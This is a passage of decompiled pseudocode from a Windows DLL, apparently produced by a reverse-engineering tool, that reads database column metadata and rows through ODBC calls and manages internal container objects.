  LONG v42; // [esp+68h] [ebp-2884h] BYREF
  int v43; // [esp+6Ch] [ebp-2880h] BYREF
  LONG v44; // [esp+70h] [ebp-287Ch] BYREF
  int v45; // [esp+74h] [ebp-2878h] BYREF
  LONG v46; // [esp+78h] [ebp-2874h] BYREF
  int v47; // [esp+7Ch] [ebp-2870h] BYREF
  LONG v48[2]; // [esp+80h] [ebp-286Ch] BYREF
  LONG v49[2]; // [esp+88h] [ebp-2864h] BYREF
  LONG v50[2]; // [esp+90h] [ebp-285Ch] BYREF
  LONG v51[2]; // [esp+98h] [ebp-2854h] BYREF
  LONG v52[2]; // [esp+A0h] [ebp-284Ch] BYREF
  LONG v53[2]; // [esp+A8h] [ebp-2844h] BYREF
  LONG v54[2]; // [esp+B0h] [ebp-283Ch] BYREF
  LONG v55[2]; // [esp+B8h] [ebp-2834h] BYREF
  LONG v56; // [esp+C0h] [ebp-282Ch] BYREF
  _DWORD v57[4]; // [esp+C4h] [ebp-2828h] BYREF
  wchar_t v58[512]; // [esp+D4h] [ebp-2818h] BYREF
  wchar_t v59[512]; // [esp+4D4h] [ebp-2418h] BYREF
  wchar_t TargetValue[512]; // [esp+8D4h] [ebp-2018h] BYREF
  wchar_t v61[512]; // [esp+CD4h] [ebp-1C18h] BYREF
  wchar_t v62[512]; // [esp+10D4h] [ebp-1818h] BYREF
  wchar_t v63[512]; // [esp+14D4h] [ebp-1418h] BYREF
  wchar_t v64[512]; // [esp+18D4h] [ebp-1018h] BYREF
  wchar_t v65[512]; // [esp+1CD4h] [ebp-C18h] BYREF
  wchar_t String[512]; // [esp+20D4h] [ebp-818h] BYREF
  wchar_t v67[514]; // [esp+24D4h] [ebp-418h] BYREF
  int v68; // [esp+28E8h] [ebp-4h]

  sub_1004D0C3(*(_BYTE *)(this + 80), (int)v26, 3, *(SQLHANDLE *)(*(_DWORD *)(this + 20) + 8));
  v68 = 0;
  StrLen_or_Ind = 0xFFFF;
  v2 = SQLBindCol(StatementHandle, 1u, -8, TargetValue, 1024, &StrLen_or_Ind);
  sub_1004D260(v2);
  v3 = SQLBindCol(StatementHandle, 2u, -8, v65, 1024, &StrLen_or_Ind);
  sub_1004D260(v3);
  v4 = SQLBindCol(StatementHandle, 3u, -8, String, 1024, &StrLen_or_Ind);
  sub_1004D260(v4);
  v5 = SQLBindCol(StatementHandle, 4u, -8, v62, 1024, &StrLen_or_Ind);
  sub_1004D260(v5);
  v6 = SQLBindCol(StatementHandle, 5u, -8, v67, 1024, &StrLen_or_Ind);
  sub_1004D260(v6);
  v7 = SQLBindCol(StatementHandle, 6u, -8, v58, 1024, &StrLen_or_Ind);
  sub_1004D260(v7);
  v8 = SQLBindCol(StatementHandle, 0xCu, -8, v63, 1024, &StrLen_or_Ind);
  sub_1004D260(v8);
  v9 = SQLBindCol(StatementHandle, 0xDu, -8, v64, 1024, &StrLen_or_Ind);
  sub_1004D260(v9);
  v10 = SQLBindCol(StatementHandle, 0x11u, -8, v61, 1024, &StrLen_or_Ind);
  sub_1004D260(v10);
  v11 = SQLBindCol(StatementHandle, 0x12u, -8, v59, 1024, &StrLen_or_Ind);
  sub_1004D260(v11);
  v12 = SQLColumnsW(StatementHandle, *(SQLWCHAR **)(*(_DWORD *)(this + 32) + 12), -3, 0, 0, 0, -3, &szColumnName, -3);
  sub_1004D260(v12);
  v25 = 0;
  while ( (unsigned __int16)v12 <= 1u )
  {
    v14 = v25 == (void *)1000;
    if ( (unsigned int)v25 >= 0x3E8 )
      goto LABEL_13;
    sub_100393E6(&v47);
    LOBYTE(v68) = 1;
    v12 = SQLFetch(StatementHandle);
    sub_1004D260(v12);
    sub_1000D17D(v28, String);
    LOBYTE(v68) = 2;
    v15 = this + 44;
    if ( !(*(unsigned __int8 (__thiscall **)(int, int *))(*(_DWORD *)(this + 44) + 8))(this + 44, v28) )
    {
      sub_10038BE3(v57);
      LOBYTE(v68) = 3;
      (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)v15 + 24))(this + 44, v28, v16);
      LOBYTE(v68) = 2;
      sub_10038C5A(v57);
    }
    sub_1000D17D(&v45, TargetValue);
    LOBYTE(v68) = 4;
    sub_10001236(&v46, v49);
    LOBYTE(v68) = 2;
    sub_1000D3AD(&v45);
    sub_1000D17D(&v39, v64);
    LOBYTE(v68) = 5;
    sub_10001236(&v40, v53);
    LOBYTE(v68) = 2;
    sub_1000D3AD(&v39);
    sub_1000D17D(&v43, v62);
    LOBYTE(v68) = 6;
    sub_10001236(&v44, v50);
    LOBYTE(v68) = 2;
    sub_1000D3AD(&v43);
    sub_1000D17D(&v41, v58);
    LOBYTE(v68) = 7;
    sub_10001236(&v42, v51);
    LOBYTE(v68) = 2;
    sub_1000D3AD(&v41);
    sub_1000D17D(&v37, v59);
    LOBYTE(v68) = 8;
    sub_10001236(&v38, &v56);
    LOBYTE(v68) = 2;
    sub_1000D3AD(&v37);
    sub_1000D17D(&v31, v61);
    LOBYTE(v68) = 9;
    sub_10001236(&v32, v54);
    LOBYTE(v68) = 2;
    sub_1000D3AD(&v31);
    sub_1000D17D(&v33, v63);
    LOBYTE(v68) = 10;
    sub_10001236(&v34, v52);
    LOBYTE(v68) = 2;
    sub_1000D3AD(&v33);
    sub_1000D17D(&v35, v65);
    LOBYTE(v68) = 11;
    sub_10001236(&v36, v48);
    LOBYTE(v68) = 2;
    sub_1000D3AD(&v35);
    sub_1000D17D(&v29, v67);
    LOBYTE(v68) = 12;
    sub_10001236(&v30, v55);
    LOBYTE(v68) = 2;
    sub_1000D3AD(&v29);
    v17 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)v15 + 16))(this + 44, v28);
    (*(void (__thiscall **)(int, int *))(*(_DWORD *)v17 + 36))(v17, &v47);
    v18 = *(void **)(this + 40);
    v25 = (char *)v25 + 1;
    if ( v18 )
    {
      v19 = WaitForSingleObjectEx(v18, 0, 1);
      if ( v19 != 258 )
      {
        if ( *(_BYTE *)(this + 80) )
        {
          sub_10029BC2(v19);
          v23 = v20;
          v22 = v20;
          v25 = &v22;
          sub_1000728E(&v22, 0);
          LOBYTE(v68) = 2;
          sub_1004F292((_DWORD *)dword_10182DE8, 13, this + 28, v22, v23);
        }
        LOBYTE(v68) = 1;
        sub_1000D3AD(v28);
        LOBYTE(v68) = 0;
        sub_100392FB(&v47);
        goto LABEL_16;
      }
    }
    LOBYTE(v68) = 1;
    sub_1000D3AD(v28);
    LOBYTE(v68) = 0;
    sub_100392FB(&v47);
  }
  v14 = v25 == (void *)1000;
LABEL_13:
  if ( v14 && *(_BYTE *)(this + 80) )
  {
    sub_10029BC2(v13);
    sub_1000D17D(&v29, &word_10175510);
    LOBYTE(v68) = 14;
    v23 = v21;
    v22 = v21;
    v25 = &v22;
    sub_1000728E(&v22, 0);
    LOBYTE(v68) = 14;
    sub_1004F292((_DWORD *)dword_10182DE8, 110, (int)&v29, v22, v23);
    LOBYTE(v68) = 0;
    sub_1000D3AD(&v29);
  }
LABEL_16:
  v68 = -1;
  sub_1004D19B(v26);
}
// 10043EEC: variable 'v16' is possibly undefined
// 1004417D: variable 'v20' is possibly undefined
// 100441E1: variable 'v13' is possibly undefined
// 100441FD: variable 'v21' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 10043C45: using guessed type wchar_t TargetValue[512];
// 10043C45: using guessed type LONG var_2834[2];
// 10043C45: using guessed type _DWORD var_2828[4];
// 10043C45: using guessed type LONG var_2864[2];
// 10043C45: using guessed type LONG var_2844[2];
// 10043C45: using guessed type LONG var_285C[2];
// 10043C45: using guessed type LONG var_2854[2];
// 10043C45: using guessed type LONG var_283C[2];
// 10043C45: using guessed type LONG var_284C[2];
// 10043C45: using guessed type LONG var_286C[2];

//----- (10044274) --------------------------------------------------------
_DWORD *__thiscall sub_10044274(unsigned int *this, int a2, _DWORD *a3)
{
  LONG *v4; // eax
  int v6[5]; // [esp+10h] [ebp-28h] BYREF
  char v7[13]; // [esp+27h] [ebp-11h] BYREF
  int v8; // [esp+34h] [ebp-4h]

  *a3 = 0;
  a3[1] = 0;
  v8 = 0;
  v7[0] = 0;
  sub_10043C45(a2);
  v4 = (LONG *)sub_100442FD(a2, v6, this[3], (SQLINTEGER)v7);
  LOBYTE(v8) = 1;
  sub_1000B3BD(v4, (int)this);
  LOBYTE(v8) = 0;
  sub_1000B3DF(v6);
  if ( v7[0] )
    a3[1] = 2;
  return a3;
}
// 10044274: using guessed type char var_11[13];
// 10044274: using guessed type int var_28[5];

//----- (100442FD) --------------------------------------------------------
void *__thiscall sub_100442FD(SQLINTEGER this, void *a2, unsigned int a3, SQLINTEGER a4)
{
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  void *v9; // eax
  int v10; // edx
  void *v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  unsigned int v16; // eax
  int v17; // eax
  unsigned int v18; // eax
  int v19; // eax
  int v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // eax
  int v24; // eax
  SQLHSTMT v25; // esi
  SQLUSMALLINT v26; // ax
  unsigned __int16 v27; // ax
  int v28; // eax
  unsigned __int16 v29; // ax
  unsigned __int16 v30; // si
  _DWORD *v31; // eax
  void *v33; // eax
  void *v34; // ecx
  _DWORD *v35; // eax
  void *v36; // esi
  _DWORD *v38; // eax
  int v39; // ecx
  int v40; // [esp-14h] [ebp-FCh] BYREF
  void *v41; // [esp-10h] [ebp-F8h]
  void **v42; // [esp-Ch] [ebp-F4h]
  unsigned int v43; // [esp-4h] [ebp-ECh]
  int v44[2]; // [esp+10h] [ebp-D8h] BYREF
  int v45; // [esp+18h] [ebp-D0h] BYREF
  _DWORD v46[9]; // [esp+1Ch] [ebp-CCh] BYREF
  int v47[5]; // [esp+40h] [ebp-A8h] BYREF
  int v48[2]; // [esp+54h] [ebp-94h] BYREF
  SQLINTEGER StrLen_or_Ind[3]; // [esp+5Ch] [ebp-8Ch] BYREF
  char v50[8]; // [esp+68h] [ebp-80h] BYREF
  SQLHSTMT StatementHandle; // [esp+70h] [ebp-78h]
  void *v52; // [esp+78h] [ebp-70h]
  int v53; // [esp+7Ch] [ebp-6Ch] BYREF
  int v54; // [esp+80h] [ebp-68h]
  int v55[9]; // [esp+84h] [ebp-64h] BYREF
  char v56; // [esp+ABh] [ebp-3Dh] BYREF
  void *v57[2]; // [esp+ACh] [ebp-3Ch] BYREF
  int v58; // [esp+B4h] [ebp-34h]
  int v59; // [esp+B8h] [ebp-30h]
  void *v60[2]; // [esp+BCh] [ebp-2Ch] BYREF
  unsigned int v61; // [esp+C4h] [ebp-24h]
  void *v62; // [esp+C8h] [ebp-20h]
  int v63; // [esp+CCh] [ebp-1Ch]
  char v64; // [esp+D2h] [ebp-16h]
  char v65; // [esp+D3h] [ebp-15h]
  int v66; // [esp+D4h] [ebp-14h]
  int v67; // [esp+E4h] [ebp-4h]
  wchar_t TargetValue[512]; // [esp+E8h] [ebp+0h] BYREF

  StrLen_or_Ind[2] = this;
  v62 = a2;
  StrLen_or_Ind[1] = a4;
  v63 = 0;
  sub_1001AC1E((int)v46);
  v67 = 1;
  sub_1001A969(v46, v55, 1);
  LOBYTE(v67) = 2;
  sub_1000D17D(&v53, &word_10175514);
  v65 = 0;
  v64 = 0;
  StrLen_or_Ind[0] = 0;
  v66 = 0;
  LOBYTE(v67) = 4;
  v43 = a3;
  v5 = (*(int (__thiscall **)(int))(*(_DWORD *)(this + 44) + 4))(this + 44);
  v66 = sub_10044A12(v5, a3);
  (*(void (__thiscall **)(int, void **))(*(_DWORD *)(this + 44) + 36))(this + 44, v57);
  LOBYTE(v67) = 5;
  while ( 1 )
  {
    if ( (*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v57[0] + 4))(v57[0]) )
    {
      LOBYTE(v67) = 4;
      sub_10007D7A(v57);
      v67 = 3;
      sub_1001AD84(v46, (int)v62);
      v63 |= 1u;
      goto LABEL_18;
    }
    v6 = (*(int (__thiscall **)(void *))(*(_DWORD *)v57[0] + 12))(v57[0]);
    v7 = (*(int (__thiscall **)(int, int))(*(_DWORD *)(this + 44) + 16))(this + 44, v6);
    v42 = (void **)a3;
    v8 = (*(int (__thiscall **)(int))(*(_DWORD *)v7 + 4))(v7);
    v66 = sub_10044A12(v8, a3);
    v9 = (void *)(*(int (__thiscall **)(void *))(*(_DWORD *)v57[0] + 12))(v57[0]);
    v42 = v60;
    v10 = *(_DWORD *)(this + 44);
    v41 = v9;
    v11 = (void *)(*(int (__thiscall **)(int))(v10 + 16))(this + 44);
    sub_10037CF0(v11, (int)v41);
    LOBYTE(v67) = 6;
LABEL_4:
    if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v60[0] + 4))(v60[0]) )
      break;
    LOBYTE(v67) = 5;
    sub_1003406C(v60);
    v65 = 0;
    sub_10021F56(v39, (int)v57[0]);
  }
  v61 = 0;
  v58 = 0;
  if ( !v64 )
  {
    v12 = (*(int (__thiscall **)(void *))(*(_DWORD *)v60[0] + 12))(v60[0]);
    v66 = sub_100449A2(v55, v12 + 8, a3);
    v13 = (*(int (__thiscall **)(void *))(*(_DWORD *)v60[0] + 12))(v60[0]);
    v66 = sub_100449A2(v55, v13, a3);
    v64 = 1;
  }
  if ( !v65 )
  {
    v14 = (*(int (__thiscall **)(void *))(*(_DWORD *)v57[0] + 12))(v57[0]);
    v66 = sub_100449A2(v55, v14, a3);
    v65 = 1;
  }
  sub_1000D17D(v48, aYes);
  LOBYTE(v67) = 8;
  v15 = (*(int (__thiscall **)(void *))(*(_DWORD *)v60[0] + 12))(v60[0]);
  LOBYTE(v52) = sub_1000D65C((int)v48, v15 + 64) == 0;
  v41 = v52;
  (*(void (__thiscall **)(int *))(v55[0] + 52))(v55);
  v16 = (*(int (__thiscall **)(int *))(v55[0] + 4))(v55);
  if ( v16 > a3 )
    sub_10044A34(v16, (int)v41);
  v66 = v16;
  LOBYTE(v67) = 6;
  sub_1000D3AD(v48);
  v17 = (*(int (__thiscall **)(void *))(*(_DWORD *)v60[0] + 12))(v60[0]);
  v18 = sub_1000D822(v17 + 48);
  v66 = sub_10044A12(v18, a3);
  v19 = (*(int (__thiscall **)(void *))(*(_DWORD *)v60[0] + 12))(v60[0]);
  v66 = sub_100449A2(v55, v19 + 16, a3);
  v20 = (*(int (__thiscall **)(void *))(*(_DWORD *)v60[0] + 12))(v60[0]);
  v66 = sub_100449A2(v55, v20 + 40, a3);
  v21 = (*(int (__thiscall **)(void *))(*(_DWORD *)v60[0] + 12))(v60[0]);
  v66 = sub_100449A2(v55, v21 + 24, a3);
  v22 = (*(int (__thiscall **)(void *))(*(_DWORD *)v60[0] + 12))(v60[0]);
  v66 = sub_100449A2(v55, v22 + 32, a3);
  v23 = (*(int (__thiscall **)(void *))(*(_DWORD *)v60[0] + 12))(v60[0]);
  v66 = sub_100449A2(v55, v23 + 56, a3);
  sub_1004D0C3(*(_BYTE *)(this + 80), (int)v50, 3, *(SQLHANDLE *)(*(_DWORD *)(this + 20) + 8));
  LOBYTE(v67) = 9;
  v24 = (*(int (__thiscall **)(void *))(*(_DWORD *)v60[0] + 12))(v60[0]);
  v25 = StatementHandle;
  v26 = sub_1000D822(v24 + 48);
  v27 = SQLBindCol(v25, v26, -8, TargetValue, 1024, StrLen_or_Ind);
  v59 = v27;
  sub_1004D260(v27);
  v28 = (*(int (__thiscall **)(void *))(*(_DWORD *)v57[0] + 12))(v57[0]);
  sub_1000D6C3((int)&v53, dword_1017DB38, *(_DWORD *)(this + 36), *(_DWORD *)(*(_DWORD *)(v28 + 4) + 12));
  LOBYTE(v67) = 10;
  v29 = SQLExecDirectW(StatementHandle, *(SQLWCHAR **)(v54 + 12), *(_DWORD *)(v54 + 28));
  v59 = v29;
  sub_1004D260(v29);
  v67 = 9;
  v58 = sub_10020446(v55);
  v66 = sub_10044A12(0, a3);
  do
  {
    if ( (unsigned __int16)v59 > 1u || v61 >= *(_DWORD *)(this + 36) )
      goto LABEL_16;
    LOBYTE(v67) = 12;
    v30 = SQLFetch(StatementHandle);
    v59 = v30;
    sub_1004D260(v30);
    if ( v30 == 100 )
    {
      LOBYTE(v67) = 9;
LABEL_16:
      sub_1004D260(v59);
      sub_1002048E(v55, v58, 0);
      sub_1001AA80(v55, v61);
      sub_1002048E(v55, 0, 2);
      LOBYTE(v67) = 6;
      sub_1004D19B(v50);
      v36 = v60[0];
      if ( (*(unsigned __int8 (**)(void))(*(_DWORD *)v60[0] + 4))() )
      {
        v38 = sub_1000E8EF(&v45);
        LOBYTE(v67) = 7;
        v40 = 104;
        sub_100078FE((int)v38);
      }
      (*(void (__thiscall **)(void *))(*(_DWORD *)v36 + 16))(v36);
      goto LABEL_4;
    }
    v31 = sub_1000D17D(v44, TargetValue);
    LOBYTE(v67) = 13;
    v66 = sub_100449A2(v55, (int)v31, a3);
    LOBYTE(v67) = 12;
    sub_1000D3AD(v44);
    ++v61;
    v67 = 9;
    v33 = *(void **)(this + 40);
  }
  while ( !v33 || WaitForSingleObjectEx(v33, 0, 1) == 258 );
  if ( *(_BYTE *)(this + 80) )
  {
    sub_10029BB6((__int32)&v56, (int)&v56);
    v41 = v34;
    v40 = (int)v34;
    v52 = &v40;
    sub_1000728E(&v40, 0);
    LOBYTE(v67) = 9;
    sub_1004F292((_DWORD *)dword_10182DE8, 13, this + 28, v40, (int)v41);
  }
  sub_1002048E(v55, v58, 0);
  sub_1001AA80(v55, v61);
  v35 = (_DWORD *)sub_1001AD84(v46, (int)v47);
  LOBYTE(v67) = 17;
  sub_1000B67C(v35, (int)v62, 0, v66);
  v63 |= 1u;
  LOBYTE(v67) = 9;
  sub_1000B3DF(v47);
  LOBYTE(v67) = 6;
  sub_1004D19B(v50);
  LOBYTE(v67) = 5;
  sub_1003406C(v60);
  LOBYTE(v67) = 4;
  sub_10007D7A(v57);
LABEL_18:
  LOBYTE(v67) = 2;
  sub_1000D3AD(&v53);
  LOBYTE(v67) = 1;
  sub_1001A9CE((int)v55);
  LOBYTE(v67) = 0;
  sub_1001AC89((int)v46);
  return v62;
}
// 10044827: variable 'v34' is possibly undefined
// 10044920: variable 'v39' is possibly undefined
// 10044A12: using guessed type _DWORD __stdcall sub_10044A12(_DWORD, _DWORD);
// 10182DE8: using guessed type int dword_10182DE8;
// 100442FD: using guessed type _DWORD var_4D0[9];
// 100442FD: using guessed type wchar_t TargetValue[512];
// 100442FD: using guessed type int var_4AC[5];

//----- (100449A2) --------------------------------------------------------
unsigned int __userpurge sub_100449A2@<eax>(int *a1@<esi>, int a2, unsigned int a3)
{
  int v3; // eax
  unsigned int result; // eax
  int v5[6]; // [esp+0h] [ebp-24h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  v5[4] = (int)v5;
  sub_1000D372(v5, a2);
  v6 = 0;
  v3 = *a1;
  v6 = -1;
  (*(void (__thiscall **)(int *))(v3 + 76))(a1);
  result = (*(int (__thiscall **)(int *))(*a1 + 4))(a1);
  if ( result > a3 )
    sub_10044A34(result, v5[0]);
  return result;
}

//----- (10044A12) --------------------------------------------------------
#error "10044A2B: call analysis failed (funcsize=12)"

//----- (10044A34) --------------------------------------------------------
void __cdecl __noreturn sub_10044A34(int a1, int a2)
{
  char pExceptionObject[4]; // [esp+10h] [ebp-14h] BYREF
  int v3[4]; // [esp+14h] [ebp-10h] BYREF

  sub_1000E7F7(v3, 1, 0);
  v3[0] = (int)&off_101033F4;
  v3[3] = 1;
  Concurrency::details::ThreadScheduler::ThreadScheduler(
    (Concurrency::details::ThreadScheduler *)pExceptionObject,
    (const struct Concurrency::SchedulerPolicy *)v3);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVOcdumgcqHztqtdism_KjyztxNxioxocif_BurqUpfqufhkrx_wvnem__);
}
// 101033F4: using guessed type int (__thiscall *off_101033F4)(void *Block, char);
// 10044A34: using guessed type char pExceptionObject[4];

//----- (10044A7E) --------------------------------------------------------
_DWORD *__thiscall sub_10044A7E(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x28u);
  if ( v3 )
    v4 = sub_10044B4D(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (10044AEF) --------------------------------------------------------
_DWORD *__thiscall sub_10044AEF(void *this, _DWORD *a2)
{
  _DWORD *v3; // esi
  int v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
  {
    v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v3[1] = this;
    *v3 = &off_10103A90;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10039112(a2, (int)v3);
  return a2;
}
// 10103A90: using guessed type int (__thiscall *off_10103A90)(void *Block, char);

//----- (10044B4D) --------------------------------------------------------
_DWORD *__stdcall sub_10044B4D(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_101040C4;
  a1[2] = off_10104064;
  sub_1000D17D(a1 + 3, (wchar_t *)&word_10102960);
  sub_10038BE3(a1 + 5);
  a1[9] = 0;
  return a1;
}
// 10104064: using guessed type int (__thiscall *off_10104064[2])(void *Block, char);
// 101040C4: using guessed type int (__stdcall *off_101040C4)(char);

//----- (10044BA7) --------------------------------------------------------
BOOL __thiscall sub_10044BA7(_DWORD *this)
{
  return this[9] != 0;
}

//----- (10044BB1) --------------------------------------------------------
_DWORD *__thiscall sub_10044BB1(_DWORD *this)
{
  _DWORD *v1; // esi
  int v2; // eax
  int v3; // eax

  v1 = this;
  v2 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(this[1] + 4) + 44))(this[1] + 4, this[9]);
  sub_10001236((LONG *)(v2 + 4), v1 + 4);
  v3 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(v1[1] + 20) + 44))(v1[1] + 20, v1[9]);
  v1 += 2;
  (*(void (__thiscall **)(_DWORD *, int))(v1[3] + 56))(v1 + 3, v3);
  return v1;
}

//----- (10044BEB) --------------------------------------------------------
void __thiscall sub_10044BEB(_DWORD *this)
{
  --this[9];
}

//----- (10044BEF) --------------------------------------------------------
void __thiscall sub_10044BEF(int *this)
{
  *this = (int)off_10104064;
  sub_10038C5A(this + 3);
  sub_1000D3AD(this + 1);
}
// 10104064: using guessed type int (__thiscall *off_10104064[2])(void *Block, char);

//----- (10044C24) --------------------------------------------------------
int *__thiscall sub_10044C24(int *this, char a2)
{
  sub_10044BEF(this + 2);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (10044C58) --------------------------------------------------------
int *__thiscall sub_10044C58(int *Block, char a2)
{
  sub_10044BEF(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10044C74) --------------------------------------------------------
void __thiscall sub_10044C74(void *this)
{
  sub_10040447((int)this);
}

//----- (10044C9F) --------------------------------------------------------
int *__thiscall sub_10044C9F(int *this, int *a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (void (__thiscall ***)(_DWORD, int))this[3];
    if ( v3 )
    {
      if ( *(v3 - 1) )
        (**v3)(v3, 3);
      else
        j_j__free(v3 - 1);
    }
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (10044CF3) --------------------------------------------------------
void __thiscall sub_10044CF3(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx

  *this = &off_10104068;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j_j__free(v2 - 1);
  }
  this[3] = 0;
  sub_10039F05(this);
}
// 10104068: using guessed type int (__thiscall *off_10104068)(void *Block, char);

//----- (10044D56) --------------------------------------------------------
void __thiscall sub_10044D56(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v5; // esi
  int v6; // eax
  unsigned int v7; // eax
  int v8; // esi
  _DWORD v9[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v10; // [esp+28h] [ebp-4h]
  int v11; // [esp+38h] [ebp+Ch]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_10131826);
  sub_1004537D(a2, v9);
  v10 = 0;
  v5 = *this;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  v7 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( v7 > a3 )
  {
    v8 = 16 * v7;
    v11 = v7 - a3;
    do
    {
      (*(void (__stdcall **)(int))(*(_DWORD *)(this[3] + v8) + 56))(this[3] + v8 - 16);
      v8 -= 16;
      --v11;
    }
    while ( v11 );
  }
  (*(void (__thiscall **)(unsigned int, _DWORD *))(*(_DWORD *)(16 * a3 + this[3]) + 56))(16 * a3 + this[3], v9);
  ++this[1];
  v10 = -1;
  sub_10038C5A(v9);
}
// 10044D56: using guessed type _DWORD var_1C[6];

//----- (10044DF0) --------------------------------------------------------
int __thiscall sub_10044DF0(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  unsigned int v4; // ebx
  int v5; // edi
  int v6; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10131827);
  v3 = *this;
  --this[1];
  v4 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v5 = 16 * a2;
    do
    {
      (*(void (__stdcall **)(int))(*(_DWORD *)(this[3] + v5) + 56))(this[3] + v5 + 16);
      ++v4;
      v5 += 16;
    }
    while ( v4 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(int, void *))(*(_DWORD *)(16 * v6 + this[3]) + 56))(16 * v6 + this[3], &unk_10193D00);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (10044E5B) --------------------------------------------------------
int __thiscall sub_10044E5B(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10131976);
  return this[3] + 16 * a2;
}

//----- (10044E7A) --------------------------------------------------------
int __thiscall sub_10044E7A(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10131977);
  return this[3] + 16 * a2;
}

//----- (10044E99) --------------------------------------------------------
void __thiscall sub_10044E99(_DWORD *this, unsigned int a2)
{
  void (__thiscall ***v2)(_DWORD, int); // esi

  if ( this[2] < a2 )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void (__thiscall ***)(_DWORD, int), unsigned int))(*this + 84))(
      this,
      this[1],
      v2,
      a2);
    if ( v2 )
    {
      if ( *(v2 - 1) )
        (**v2)(v2, 3);
      else
        j_j__free(v2 - 1);
    }
  }
}

//----- (10044ED1) --------------------------------------------------------
int __thiscall sub_10044ED1(int *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  int v3; // edx
  int result; // eax

  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j_j__free(v2 - 1);
  }
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10044F0A) --------------------------------------------------------
int __thiscall sub_10044F0A(_DWORD *this, unsigned int a2)
{
  unsigned int v3; // ebp
  int v4; // edi
  int v5; // eax

  v3 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 16 * a2;
    do
    {
      (*(void (__thiscall **)(int, void *))(*(_DWORD *)(this[3] + v4) + 56))(this[3] + v4, &unk_10193D00);
      ++v3;
      v4 += 16;
    }
    while ( v3 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v5 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v5 + 88))(this);
}

//----- (10044F5C) --------------------------------------------------------
unsigned int __thiscall sub_10044F5C(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_101319BE);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
